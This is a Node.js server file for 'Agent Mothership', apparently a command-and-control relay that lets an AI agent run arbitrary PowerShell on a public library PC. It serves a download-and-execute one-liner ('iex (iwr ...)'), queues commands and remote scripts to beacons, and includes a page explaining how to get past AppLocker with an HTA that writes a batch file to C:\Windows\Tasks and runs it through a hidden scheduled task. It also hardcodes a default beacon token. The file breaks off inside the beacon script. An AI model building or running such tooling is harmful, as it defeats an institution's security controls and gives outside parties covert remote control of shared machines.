const express = require('express');
const http = require('http');
const ws = require('ws');
const path = require('path');
const os = require('os');
const fs = require('fs');

let pty;
try {
  pty = require('node-pty-prebuilt-multiarch');
} catch (e1) {
  try {
    pty = require('node-pty');
  } catch (e2) {
    console.warn('[terminal] node-pty not available, falling back to child_process.spawn');
  }
}

// ──────────────────────────────────────────────
// Configuration
// ──────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
const SHELL = process.env.SHELL || (process.platform === 'win32' ? 'cmd.exe' : '/bin/bash');
const STARTUP_DIR = process.env.HOME || os.homedir() || '/root';
const AUTH_TOKEN = process.env.MOTHERSHIP_AUTH_TOKEN || '';
const BEACON_TOKEN = process.env.BEACON_TOKEN || 'mothership-beacon-2024';

// Host info for beacon script (set dynamically from requests)
let reqHost = 'localhost:3000';
let reqWsProtocol = 'wss';

// External tunnel URL — read from .tunnel-url file if available
function getExternalHost() {
  try {
    const tunnelUrl = fs.readFileSync(path.join(__dirname, '..', '.tunnel-url'), 'utf8').trim();
    if (tunnelUrl.startsWith('https://')) {
      return tunnelUrl.replace('https://', '');
    }
  } catch (e) {}
  return 'localhost:3000';
}

// ──────────────────────────────────────────────
// Express app
// ──────────────────────────────────────────────
const app = express();
const server = http.createServer(app);

app.use(express.json());

// Simple auth middleware
app.use((req, res, next) => {
  if (!AUTH_TOKEN) return next();

  const auth = req.headers['authorization'];
  if (auth === `Bearer ${AUTH_TOKEN}`) {
    return next();
  }

  if (req.query && req.query.token === AUTH_TOKEN) {
    return next();
  }

  if (req.path === '/health' || req.path.startsWith('/api/') || req.path === '/beacon-script' || req.path === '/beacon-run' || req.path === '/oneliner' || req.path === '/connect' || req.path.startsWith('/download/') || req.path.endsWith('.hta')) {
    return next();
  }

  if (req.path === '/' || req.path === '/index.html') {
    return res.send(`
      <!DOCTYPE html>
      <html><head><title>Mothership</title>
      <style>body{font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;background:#1a1a2e;color:#e0e0e0}form{display:flex;flex-direction:column;gap:12px;padding:40px;border:1px solid #e94560;border-radius:8px}input{padding:8px;background:#16213e;border:1px solid #0f3460;color:#fff;font-family:monospace}button{padding:8px 16px;background:#e94560;border:none;color:#fff;cursor:pointer;font-family:monospace}</style></head>
      <body>
        <form method="GET">
          <h2>🔐 Agent Mothership</h2>
          <input type="password" name="token" placeholder="Auth token" required>
          <button type="submit">Connect</button>
        </form>
      </body></html>
    `);
  }

  return res.status(401).send('Unauthorized');
});

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'ok', uptime: process.uptime() });
});

// ──────────────────────────────────────────────
// Beacon Relay — Library PC Remote Control
// ──────────────────────────────────────────────
let beaconConnection = null;
let beaconInfo = {};
let pendingCommands = new Map();
let commandIdCounter = 0;

// HTTP beacon support (Python-based REST polling beacons)
let httpBeacons = new Map(); // beaconId -> { lastPoll, pendingCmd, result }
let httpCommandQueue = new Map(); // beaconId -> [commands]
let commandResults = new Map(); // id -> { stdout, stderr, exitCode }

// Helper: check beacon token for API access
function checkBeaconAuth(req, res, next) {
  const token = req.headers['x-beacon-token'] || req.query.token;
  if (BEACON_TOKEN && token !== BEACON_TOKEN) {
    return res.status(401).json({ error: 'Unauthorized. Provide x-beacon-token header or ?token= param.' });
  }
  next();
}

// Beacon status
app.get('/api/beacon/status', checkBeaconAuth, (req, res) => {
  res.json({
    connected: beaconConnection !== null,
    beacon: beaconConnection ? beaconInfo : null,
    pendingCommands: pendingCommands.size,
  });
});

// Send a command to the connected beacon (library PC)
// POST /api/beacon/command  { "command": "powershell command here" }
// Header: x-beacon-token: mothership-beacon-2024
app.post('/api/beacon/command', checkBeaconAuth, async (req, res) => {
  const command = req.body.command;
  const target = req.body.target; // optional: specific beaconId for HTTP beacon
  if (!command || typeof command !== 'string') {
    return res.status(400).json({ error: 'Missing "command" in request body' });
  }

  if (target && httpBeacons.has(target)) {
    // Route to a specific HTTP beacon
    const id = ++commandIdCounter;
    const queue = httpCommandQueue.get(target) || [];
    queue.push({ id, command });
    console.log(`[HTTP Beacon] Queued command ${id} for ${target}: ${command.substring(0, 60)}`);
    res.json({ queued: true, id, target, note: 'Command queued for HTTP beacon. Poll /api/beacon/poll to retrieve.' });
    return;
  }

  if (httpBeacons.size > 0 && !beaconConnection) {
    // No WS beacon, but HTTP beacons exist — queue to the first one
    const beaconId = httpBeacons.keys().next().value;
    const id = ++commandIdCounter;
    const queue = httpCommandQueue.get(beaconId) || [];
    queue.push({ id, command });
    console.log(`[HTTP Beacon] Queued command ${id} for ${beaconId}: ${command.substring(0, 60)}`);
    res.json({ queued: true, id, target: beaconId, note: 'Command queued for HTTP beacon.' });
    return;
  }

  if (!beaconConnection) {
    return res.status(503).json({ error: 'No beacon connected. Run beacon.ps1 on your library PC first.' });
  }

    const id = ++commandIdCounter;

    try {
      const result = await new Promise((resolve, reject) => {
        pendingCommands.set(id, resolve);

        // Send command to the beacon
        beaconConnection.send(JSON.stringify({ id, command }));

        // Set a base timeout (300s) — extended to 600s if beacon sends ack
        let commandTimedOut = false;
        const baseTimeout = setTimeout(() => {
          if (pendingCommands.has(id)) {
            pendingCommands.delete(id);
            commandTimedOut = true;
            resolve({ error: 'Command timed out after 5 minutes', id });
          }
        }, 300000);

        // Replace the default resolve with one that handles ack
        pendingCommands.set(id, (msg) => {
          if (msg.type === 'ack' && !commandTimedOut) {
            // Beacon acknowledged — extend timeout to 10 minutes
            clearTimeout(baseTimeout);
            setTimeout(() => {
              if (pendingCommands.has(id)) {
                pendingCommands.delete(id);
                commandTimedOut = true;
                resolve({ error: 'Command timed out after 10 minutes', id });
              }
            }, 600000);
            return;
          }
          // Actual result — resolve
          if (pendingCommands.has(id)) {
            pendingCommands.delete(id);
          }
          clearTimeout(baseTimeout);
          resolve(msg);
        });
      });

      res.json(result);
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
});

// Serve the beacon PowerShell script for easy copy-paste
app.get('/beacon-script', (req, res) => {
  reqHost = req.headers.host || 'localhost:3000';
  const proto = req.headers['x-forwarded-proto'] || req.protocol;
  reqWsProtocol = proto === 'https' ? 'wss' : 'ws';
  res.type('text/plain').send(getBeaconScript());
});

// ──────────────────────────────────────────────
// Script Serving — NO ESCAPING ISSUES
// ──────────────────────────────────────────────
// Write a .ps1 script to public/scripts/ and tell the beacon to download & run it.
// This completely bypasses the bash→curl→JSON→PowerShell escaping nightmare.
app.post('/api/beacon/script', checkBeaconAuth, async (req, res) => {
  if (!beaconConnection) {
    return res.status(503).json({ error: 'No beacon connected.' });
  }

  const scriptContent = req.body.script;
  if (!scriptContent || typeof scriptContent !== 'string') {
    return res.status(400).json({ error: 'Missing "script" in request body' });
  }

  // Sanitize script name — strip path traversal characters
  const rawName = (req.body.name || 'cmd_' + Date.now());
  const safeName = rawName.replace(/[^a-zA-Z0-9_-]/g, '_') + '.ps1';
  const scriptsDir = path.join(__dirname, 'public', 'scripts');
  
  // Ensure scripts directory exists
  if (!fs.existsSync(scriptsDir)) {
    fs.mkdirSync(scriptsDir, { recursive: true });
  }
  
  const scriptPath = path.join(scriptsDir, safeName);
  fs.writeFileSync(scriptPath, scriptContent, 'utf8');
  
  // Build the script URL — use tunnel hostname so library PC can reach it
  const externalHost = getExternalHost();
  const scriptUrl = 'https://' + externalHost + '/scripts/' + safeName;
  
    const id = ++commandIdCounter;

    try {
      const result = await new Promise((resolve, reject) => {
        pendingCommands.set(id, resolve);

        // Send scriptUrl to beacon (NO escaping issues — it's just a URL!)
        beaconConnection.send(JSON.stringify({ id, scriptUrl }));

        let commandTimedOut = false;
        const baseTimeout = setTimeout(() => {
          if (pendingCommands.has(id)) {
            pendingCommands.delete(id);
            commandTimedOut = true;
            resolve({ error: 'Script timed out after 5 minutes', id });
          }
        }, 300000);

        pendingCommands.set(id, (msg) => {
          if (msg.type === 'ack' && !commandTimedOut) {
            clearTimeout(baseTimeout);
            setTimeout(() => {
              if (pendingCommands.has(id)) {
                pendingCommands.delete(id);
                commandTimedOut = true;
                resolve({ error: 'Script timed out after 10 minutes', id });
              }
            }, 600000);
            return;
          }
          if (pendingCommands.has(id)) {
            pendingCommands.delete(id);
          }
          clearTimeout(baseTimeout);
          resolve(msg);
        });
      });

      res.json({ scriptUrl, ...result });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
});

// ──────────────────────────────────────────────
// HTTP Beacon REST API (for Python-based persistent beacons)
// ──────────────────────────────────────────────

// POST /api/beacon/register — HTTP beacon announces itself
app.post('/api/beacon/register', (req, res) => {
  const { beaconId, info } = req.body || {};
  if (!beaconId) return res.status(400).json({ error: 'beaconId required' });
  httpBeacons.set(beaconId, { lastPoll: Date.now(), info: info || {}, pendingCmd: null });
  if (!httpCommandQueue.has(beaconId)) httpCommandQueue.set(beaconId, []);
  console.log(`[HTTP Beacon] Registered: ${beaconId}`);
  res.json({ ok: true, beaconId });
});

// GET /api/beacon/poll?beaconId=xxx — HTTP beacon polls for commands
app.get('/api/beacon/poll', (req, res) => {
  const beaconId = req.query.beaconId;
  if (!beaconId || !httpBeacons.has(beaconId)) return res.status(404).json({ error: 'beacon not found' });
  const beacon = httpBeacons.get(beaconId);
  beacon.lastPoll = Date.now();
  const queue = httpCommandQueue.get(beaconId) || [];
  if (queue.length > 0) {
    const cmd = queue.shift();
    beacon.pendingCmd = cmd.id;
    console.log(`[HTTP Beacon] Sending command ${cmd.id} to ${beaconId}: ${cmd.command?.substring(0, 60)}`);
    res.json({ command: cmd.command, id: cmd.id });
  } else {
    res.json({ command: null, id: null });
  }
});

// POST /api/beacon/ack — HTTP beacon acknowledges command execution
app.post('/api/beacon/ack', (req, res) => {
  const { beaconId, id } = req.body || {};
  if (!beaconId || !httpBeacons.has(beaconId)) return res.status(404).json({ error: 'beacon not found' });
  console.log(`[HTTP Beacon] Ack received: beacon=${beaconId}, id=${id}`);
  res.json({ ok: true });
});

// POST /api/beacon/result — HTTP beacon submits command result
app.post('/api/beacon/result', (req, res) => {
  const { beaconId, id, stdout, stderr, exitCode } = req.body || {};
  if (!beaconId || !httpBeacons.has(beaconId)) return res.status(404).json({ error: 'beacon not found' });
  const beacon = httpBeacons.get(beaconId);
  beacon.pendingCmd = null;
  console.log(`[HTTP Beacon] Result: beacon=${beaconId}, id=${id}, exitCode=${exitCode}`);
  // Resolve any pending promise that was waiting for this command
  if (pendingCommands.has(id)) {
    pendingCommands.get(id)({ type: 'result', id, stdout, stderr, exitCode });
  }
  // Cache result for later retrieval
  commandResults.set(id, { stdout, stderr, exitCode, beaconId, ts: Date.now() });
  // Keep only last 100 results
  if (commandResults.size > 100) {
    const firstKey = commandResults.keys().next().value;
    commandResults.delete(firstKey);
  }
  res.json({ ok: true });
});

// GET /api/beacon/result/:id — retrieve a command result
app.get('/api/beacon/result/:id', checkBeaconAuth, (req, res) => {
  const id = parseInt(req.params.id, 10);
  if (commandResults.has(id)) {
    res.json(commandResults.get(id));
  } else {
    res.json({ error: 'Result not found or not yet available', id });
  }
});

// GET /api/beacon/list — list all registered beacons
app.get('/api/beacon/list', (req, res) => {
  const beacons = [];
  for (const [beaconId, beacon] of httpBeacons) {
    beacons.push({
      beaconId,
      lastPoll: beacon.lastPoll,
      info: beacon.info,
      pendingCmd: beacon.pendingCmd,
      queueLength: (httpCommandQueue.get(beaconId) || []).length,
    });
  }
  if (beaconConnection) beacons.push({ beaconId: 'websocket', type: 'ws', info: beaconInfo });
  res.json({ beacons });
});

// Serve the raw one-liner as plain text (no HTML) — for easy copy from browser
app.get('/oneliner', (req, res) => {
  reqHost = req.headers.host || 'localhost:3000';
  const proto = req.headers['x-forwarded-proto'] || req.protocol;
  const httpProto = proto === 'https' ? 'https' : 'http';
  const scriptUrl = httpProto + '://' + reqHost + '/beacon-script';
  const oneLiner = 'iex (iwr -Uri ' + scriptUrl + ').Content';
  res.type('text/plain').send(oneLiner);
});

// ──────────────────────────────────────────────
// Download endpoint — serve .vbs and .bat as downloadable files
// ──────────────────────────────────────────────
app.get('/download/:filename', (req, res) => {
  const filename = req.params.filename;
  // Only allow specific filenames — prevent path traversal
  const allowed = ['connect.vbs', 'connect.bat', 'connect.hta', 'connect-schtasks.hta'];
  if (!allowed.includes(filename)) {
    return res.status(404).send('File not found');
  }
  const filePath = path.join(__dirname, 'public', filename);
  if (!fs.existsSync(filePath)) {
    return res.status(404).send('File not found');
  }
  res.download(filePath, filename);
});

// View raw file in browser (text display, not download) — for copy-paste into Notepad
app.get('/view/:filename', (req, res) => {
  const filename = req.params.filename;
  const allowed = ['connect.vbs', 'connect.bat', 'grok-report.txt', 'test_com.ps1', 'test_stagent.ps1'];
  if (!allowed.includes(filename)) {
    return res.status(404).send('File not found');
  }
  const filePath = path.join(__dirname, 'public', filename);
  if (!fs.existsSync(filePath)) {
    return res.status(404).send('File not found');
  }
  res.type('text/plain').send(fs.readFileSync(filePath, 'utf8'));
});

// ──────────────────────────────────────────────
// Connect page — download VBScript/BAT to connect the beacon
// ──────────────────────────────────────────────
app.get('/connect', (req, res) => {
  const externalHost = getExternalHost();
  const tunnelUrl = 'https://' + externalHost;

  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🪟 Connect Beacon — SCHTASKS Sideload</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #1a1a2e;
      color: #e0e0e0;
      font-family: 'Segoe UI', system-ui, sans-serif;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .container {
      max-width: 800px;
      width: 100%;
      background: #16213e;
      border: 1px solid #0f3460;
      border-radius: 12px;
      padding: 40px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
    }
    h1 { font-size: 24px; margin-bottom: 6px; color: #e94560; }
    .subtitle { font-size: 14px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
    .subtitle code { background: #0d1117; padding: 2px 6px; border-radius: 3px; color: #4ade80; font-size: 12px; }
    .tunnel-url {
      background: #0d1117;
      border: 1px solid #0f3460;
      border-radius: 6px;
      padding: 10px 14px;
      font-family: monospace;
      font-size: 13px;
      color: #4ade80;
      word-break: break-all;
      margin-bottom: 25px;
    }
    .btn-group {
      display: flex;
      gap: 16px;
      margin-bottom: 25px;
      flex-wrap: wrap;
    }
    .btn {
      flex: 1;
      min-width: 240px;
      padding: 20px 24px;
      border-radius: 8px;
      border: 1px solid #0f3460;
      background: #0d1117;
      color: #e0e0e0;
      cursor: pointer;
      text-align: center;
      text-decoration: none;
      transition: all 0.15s;
      font-family: inherit;
    }
    .btn:hover {
      border-color: #e94560;
      background: #1a1a2e;
      transform: translateY(-2px);
    }
    .btn .icon { font-size: 30px; display: block; margin-bottom: 8px; }
    .btn .label { font-size: 16px; font-weight: 600; }
    .btn .desc { font-size: 12px; color: #888; margin-top: 4px; line-height: 1.4; }
    .btn.primary {
      background: #e94560;
      border-color: #e94560;
      color: #fff;
    }
    .btn.primary:hover { background: #d63851; }
    .btn.recommended {
      border-color: #f59e0b;
      position: relative;
    }
    .btn.recommended::before {
      content: '⭐ BEST CHOICE — SCHTASKS SIDELOAD';
      position: absolute;
      top: -10px;
      left: 50%;
      transform: translateX(-50%);
      background: #f59e0b;
      color: #000;
      font-size: 9px;
      font-weight: 700;
      padding: 2px 10px;
      border-radius: 4px;
      letter-spacing: 0.3px;
      white-space: nowrap;
    }
    .chain {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      margin-bottom: 25px;
      flex-wrap: wrap;
      font-size: 11px;
      color: #666;
    }
    .chain span {
      background: #0d1117;
      border: 1px solid #0f3460;
      border-radius: 4px;
      padding: 4px 8px;
      color: #888;
    }
    .chain .arrow { background: none; border: none; padding: 0; color: #555; font-size: 14px; }
    .chain .trusted { color: #4ade80; border-color: #1a3a2e; }
    .instructions {
      background: #0d1117;
      border-radius: 8px;
      padding: 20px;
      border-left: 3px solid #f59e0b;
    }
    .instructions h3 { font-size: 13px; color: #60a5fa; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px; }
    .instructions ol { margin-left: 18px; line-height: 2.2; font-size: 14px; }
    .instructions li { color: #ccc; }
    .instructions li strong { color: #e0e0e0; }
    .note {
      margin-top: 20px;
      padding: 16px;
      background: #1a1a2e;
      border-radius: 6px;
      font-size: 13px;
      color: #888;
      text-align: center;
      line-height: 1.6;
    }
    .note a { color: #60a5fa; }
    .note code { background: #0d1117; padding: 1px 5px; border-radius: 3px; color: #4ade80; font-size: 12px; }
    .status { margin-top: 20px; padding: 12px; border-radius: 6px; font-size: 13px; text-align: center; background: #0d1117; border: 1px solid #0f3460; }
    .status .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; animation: pulse 1.5s infinite; }
    .status .dot.green { background: #4ade80; }
    .status .dot.yellow { background: #f59e0b; }
    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
  </style>
</head>
<body>
  <div class="container">
    <h1>🪟 Connect This PC</h1>
    <p class="subtitle">
      AppLocker blocking direct execution? This file uses <strong>SCHTASKS sideloading</strong> —
      writes to <code>C:\Windows\Tasks</code> (trusted by AppLocker path rules)
      and runs via a scheduled task in a native Windows process.
    </p>

    <div class="tunnel-url">▶ ${tunnelUrl}</div>

    <div class="chain">
      <span class="trusted">mshta.exe</span>
      <span class="arrow">→</span>
      <span class="trusted">schtasks.exe</span>
      <span class="arrow">→</span>
      <span class="trusted">cmd.exe</span>
      <span class="arrow">→</span>
      <span class="trusted">powershell.exe</span>
      <span class="arrow">→</span>
      <span>beacon</span>
    </div>
    <div style="text-align:center;font-size:11px;color:#555;margin-bottom:25px;">All binaries in <code>System32</code> — AppLocker trusted</div>

    <div class="btn-group">
      <a href="/download/connect-schtasks.hta" class="btn primary recommended">
        <span class="icon">⚡</span>
        <span class="label">Download connect-schtasks.hta</span>
        <span class="desc">Downloads beacon, writes .bat to C:\Windows\Tasks, creates+executes SCHTASKS task, self-cleans</span>
      </a>
    </div>

    <div class="instructions">
      <h3>How it works (1 click)</h3>
      <ol>
        <li><strong>Click</strong> the download button above</li>
        <li><strong>Save</strong> the file (browser prompts to save .hta)</li>
        <li><strong>Double-click</strong> connect-schtasks.hta</li>
        <li>It quietly: downloads beacon → writes <code>.bat</code> to <code>C:\Windows\Tasks</code> → creates SCHTASKS → runs it → cleans up</li>
        <li>The scheduled task runs <strong>PowerShell</strong> hidden → beacon connects to mothership 🎉</li>
      </ol>
    </div>

    <div class="note">
      <strong>Why this works:</strong> Every executable in the chain (<code>mshta.exe</code> → <code>schtasks.exe</code> → <code>cmd.exe</code> → <code>powershell.exe</code>)
      lives in <code>C:\Windows\System32\</code>. AppLocker trusts <code>%WINDIR%\*</code> by default.<br><br>
      The <code>.bat</code> file is written to <code>C:\Windows\Tasks\</code> — also within <code>%WINDIR%</code> and writable by standard users.
      This is the same technique we confirmed working in previous sessions.
    </div>

    <div class="status" id="status">
      <span class="dot green"></span>
      Mothership server is online — waiting for beacon connection...
    </div>
  </div>
</body>
</html>
  `);
});

// Serve a one-liner command to download and run the beacon
app.get('/beacon-run', (req, res) => {
  reqHost = req.headers.host || 'localhost:3000';
  const proto = req.headers['x-forwarded-proto'] || req.protocol;
  const httpProto = proto === 'https' ? 'https' : 'http';
  const scriptUrl = httpProto + '://' + reqHost + '/beacon-script';
  const oneLiner = 'iex (iwr -Uri ' + scriptUrl + ').Content';

  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🚀 Mothership Beacon — One-Liner</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #1a1a2e;
      color: #e0e0e0;
      font-family: 'Segoe UI', 'Cascadia Code', monospace;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .container {
      max-width: 800px;
      width: 100%;
      background: #16213e;
      border: 1px solid #0f3460;
      border-radius: 12px;
      padding: 40px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
    }
    h1 {
      font-size: 22px;
      margin-bottom: 8px;
      color: #e94560;
    }
    .subtitle {
      font-size: 14px;
      color: #888;
      margin-bottom: 30px;
      line-height: 1.5;
    }
    .step {
      margin-bottom: 24px;
    }
    .step-label {
      font-size: 12px;
      text-transform: uppercase;
      letter-spacing: 1px;
      color: #60a5fa;
      margin-bottom: 8px;
    }
    .command-box {
      background: #0d1117;
      border: 1px solid #0f3460;
      border-radius: 8px;
      padding: 16px 20px;
      position: relative;
      transition: border-color 0.2s;
    }
    .command-box:hover {
      border-color: #e94560;
    }
    .command-box code {
      display: block;
      font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
      font-size: 15px;
      color: #4ade80;
      word-break: break-all;
      line-height: 1.5;
      user-select: all;
    }
    .copy-btn {
      position: absolute;
      top: 8px;
      right: 8px;
      background: rgba(233, 69, 96, 0.2);
      border: 1px solid rgba(233, 69, 96, 0.3);
      color: #e94560;
      padding: 4px 12px;
      border-radius: 4px;
      cursor: pointer;
      font-size: 12px;
      font-family: inherit;
      transition: all 0.15s;
    }
    .copy-btn:hover {
      background: rgba(233, 69, 96, 0.4);
    }
    .copy-btn.copied {
      background: rgba(74, 222, 128, 0.2);
      border-color: #4ade80;
      color: #4ade80;
    }
    .instructions {
      margin-top: 30px;
      padding: 20px;
      background: #0d1117;
      border-radius: 8px;
      border-left: 3px solid #e94560;
    }
    .instructions ol {
      margin-left: 20px;
      line-height: 2;
      font-size: 14px;
    }
    .instructions li {
      color: #ccc;
    }
    .instructions li strong {
      color: #e0e0e0;
    }
    .footer {
      margin-top: 30px;
      text-align: center;
      font-size: 12px;
      color: #555;
    }
    .footer a {
      color: #e94560;
      text-decoration: none;
    }
    .alt-link {
      margin-top: 20px;
      padding: 12px;
      background: #0d1117;
      border-radius: 6px;
      font-size: 13px;
      color: #888;
      text-align: center;
    }
    .alt-link a {
      color: #60a5fa;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🚀 Agent Mothership Beacon</h1>
    <p class="subtitle">Connect this library PC to your AI agent. Copy the command below, then paste it into <strong>PowerShell</strong> (or VS Code's integrated PowerShell terminal).</p>

    <div class="step">
      <div class="step-label">Step 1: Copy this one-liner</div>
      <div class="command-box">
        <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
        <code id="oneliner">${oneLiner}</code>
      </div>
    </div>

    <div class="instructions">
      <ol>
        <li><strong>Copy</strong> the command above (click the button or select the text)</li>
        <li>Open <strong>VS Code</strong> on this PC</li>
        <li>Open the <strong>PowerShell terminal</strong> (Ctrl+Shift+P → "Terminal: Create New Terminal")</li>
        <li><strong>Paste</strong> the command and press <strong>Enter</strong></li>
        <li>You'll see it connect — you're now linked to your AI agent 🎉</li>
      </ol>
    </div>

    <div class="alt-link">
      Or open the <a href="/" target="_blank">web terminal</a> directly in your browser →
    </div>

    <div class="footer">
      Agent Mothership &mdash; <a href="https://github.com/ricksanchez8701/agent-mothership" target="_blank">GitHub</a>
    </div>
  </div>

  <script>
    function copyCmd(btn) {
      const code = document.getElementById('oneliner');
      const text = code.textContent;
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(function() {
          btn.textContent = 'Copied!';
          btn.classList.add('copied');
          setTimeout(function() { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
        });
      } else {
        // Fallback: select the text
        const range = document.createRange();
        range.selectNodeContents(code);
        const selection = window.getSelection();
        selection.removeAllRanges();
        selection.addRange(range);
        btn.textContent = 'Selected!';
        setTimeout(function() { btn.textContent = 'Copy'; }, 2000);
      }
    }
  </script>
</body>
</html>
  `);
});

// ──────────────────────────────────────────────
// WebSocket servers
// ──────────────────────────────────────────────

// Terminal WebSocket (for web browser terminal)
const terminalWss = new ws.WebSocketServer({ noServer: true });

// Beacon relay WebSocket (for library PC connection)
const beaconWss = new ws.WebSocketServer({ noServer: true });

// Manual upgrade routing based on path
server.on('upgrade', (request, socket, head) => {
  const url = new URL(request.url, 'http://localhost');

  if (url.pathname === '/beacon') {
    // Beacon connection from library PC
    const token = url.searchParams.get('token');
    if (BEACON_TOKEN && token !== BEACON_TOKEN) {
      socket.destroy();
      return;
    }
    beaconWss.handleUpgrade(request, socket, head, (ws) => {
      beaconWss.emit('connection', ws, request);
    });
  } else {
    // Terminal WebSocket connection — check auth
    if (AUTH_TOKEN) {
      if (url.searchParams.get('token') !== AUTH_TOKEN) {
        socket.destroy();
        return;
      }
    }
    terminalWss.handleUpgrade(request, socket, head, (ws) => {
      terminalWss.emit('connection', ws, request);
    });
  }
});

// ──────────────────────────────────────────────
// Beacon WebSocket handler
// ──────────────────────────────────────────────
beaconWss.on('connection', (ws, req) => {
  const clientIp = req.socket.remoteAddress;
  console.log(`[beacon] 🔌 Library PC beacon connected from ${clientIp}`);

  beaconConnection = ws;
  beaconInfo = {
    connectedAt: new Date().toISOString(),
    ip: clientIp,
    userAgent: req.headers['user-agent'] || 'unknown',
  };

  // Send a welcome / handshake message
  ws.send(JSON.stringify({
    type: 'connected',
    message: '✅ Agent Mothership beacon relay connected. Awaiting commands.',
    server: os.hostname(),
  }));

      // Handle incoming messages from the beacon
      ws.on('message', (data) => {
        try {
          const msg = JSON.parse(data.toString());

          // Handle keepalive pong
          if (msg.type === 'pong') {
            return;
          }

          // Handle command acknowledgements — beacon received it, still running
          if (msg.type === 'ack' && msg.id && pendingCommands.has(msg.id)) {
            const resolver = pendingCommands.get(msg.id);
            // Extend the timeout by passing the ack to the resolver
            resolver({ type: 'ack', id: msg.id });
            return;
          }

          // Handle command responses
          if (msg.id && pendingCommands.has(msg.id)) {
            const resolver = pendingCommands.get(msg.id);
            resolver(msg);
            pendingCommands.delete(msg.id);
            console.log(`[beacon] ✅ Command ${msg.id} completed (exit: ${msg.exitCode})`);
            return;
          }

          // Handle beacon info updates
          if (msg.type === 'info') {
            beaconInfo = { ...beaconInfo, ...msg.data };
            console.log('[beacon] 📡 Beacon info updated:', msg.data);
            return;
          }

          // Unknown message type
          console.log('[beacon] ❓ Unknown message:', msg);
        } catch (e) {
          console.log('[beacon] ⚠ Invalid message from beacon:', e.message);
        }
      });

  // Keepalive ping — every 30s to prevent Cloudflare tunnel timeout
  // Uses JSON messages instead of WebSocket ping frames because
  // Cloudflare tunnel only forwards actual data frames, not WS-level pings
  const pingInterval = setInterval(() => {
    if (ws.readyState === ws.OPEN) {
      ws.send(JSON.stringify({ type: 'ping' }));
    }
  }, 30000);

  // Handle beacon disconnection
  ws.on('close', () => {
    console.log('[beacon] 🔌 Library PC beacon disconnected');
    clearInterval(pingInterval);
    beaconConnection = null;
    beaconInfo = {};

    // Reject all pending commands
    for (const [id, resolver] of pendingCommands) {
      resolver({ error: 'Beacon disconnected', id });
    }
    pendingCommands.clear();
  });

  // Handle errors
  ws.on('error', (err) => {
    console.log('[beacon] ⚠ Beacon error:', err.message);
    clearInterval(pingInterval);
  });
});

// ──────────────────────────────────────────────
// Terminal WebSocket handler
// ──────────────────────────────────────────────
terminalWss.on('connection', (ws, req) => {
  console.log('[terminal] New client connected');

  let shell;

  // Parse cols/rows from query params for initial size
  const url = new URL(req.url || '/', 'http://localhost');
  const cols = parseInt(url.searchParams.get('cols') || '80', 10);
  const rows = parseInt(url.searchParams.get('rows') || '24', 10);

  if (pty) {
    // Use node-pty for proper terminal emulation
    shell = pty.spawn(SHELL, [], {
      name: 'xterm-256color',
      cols,
      rows,
      cwd: STARTUP_DIR,
      env: {
        ...process.env,
        TERM: 'xterm-256color',
        COLORTERM: 'truecolor',
      },
    });

    // PTY → WebSocket
    shell.onData((data) => {
      if (ws.readyState === ws.OPEN) {
        ws.send(Buffer.from(data).toString('base64'));
      }
    });

    // Handle resize
    ws.on('message', (data) => {
      const msg = data.toString();
      try {
        const json = JSON.parse(msg);
        if (json.type === 'resize' && json.cols && json.rows) {
          try { shell.resize(json.cols, json.rows); } catch (e) {}
          return;
        }
      } catch (e) {
        // Not JSON, treat as terminal input
      }
      shell.write(msg);
    });

  } else {
    // Fallback: use child_process.spawn (no resize support)
    const { spawn } = require('child_process');
    shell = spawn(SHELL, [], {
      cwd: STARTUP_DIR,
      env: {
        ...process.env,
        TERM: 'xterm-256color',
        COLORTERM: 'truecolor',
      },
    });

    shell.stdout.on('data', (d) => {
      if (ws.readyState === ws.OPEN) ws.send(d.toString('base64'));
    });
    shell.stderr.on('data', (d) => {
      if (ws.readyState === ws.OPEN) ws.send(d.toString('base64'));
    });

    ws.on('message', (data) => {
      const msg = data.toString();
      // Skip JSON messages (resize) — not supported in fallback mode
      if (msg.startsWith('{')) return;
      shell.stdin.write(msg);
    });
  }

  // Handle disconnection
  ws.on('close', () => {
    console.log('[terminal] Client disconnected');
    try { shell.kill('SIGTERM'); } catch (e) {}
  });

  // Handle shell exit
  shell.on('exit', (code) => {
    console.log('[terminal] Shell exited with code', code);
    try { if (ws.readyState === ws.OPEN) ws.close(); } catch (e) {}
  });
});

// ──────────────────────────────────────────────
// Beacon PowerShell script generator
// ──────────────────────────────────────────────
function getBeaconScript() {
  const serverHost = reqHost || 'localhost:3000';
  const wsProtocol = reqWsProtocol || 'wss';
  const wsUrl = wsProtocol + '://' + serverHost + '/beacon';

  return [
    '<#',
    '.SYNOPSIS',
    '    Agent Mothership Beacon v2 — Library PC Remote Control',
    '.DESCRIPTION',
    '    Copy-paste this entire script into VS Code\'s PowerShell terminal on your',
    '    library PC. It connects back to the Agent Mothership relay server so the',
    '    AI agent can control your PC remotely.',
    '',
    '    Once connected, the AI can:',
    '    - Run any PowerShell command on your PC',
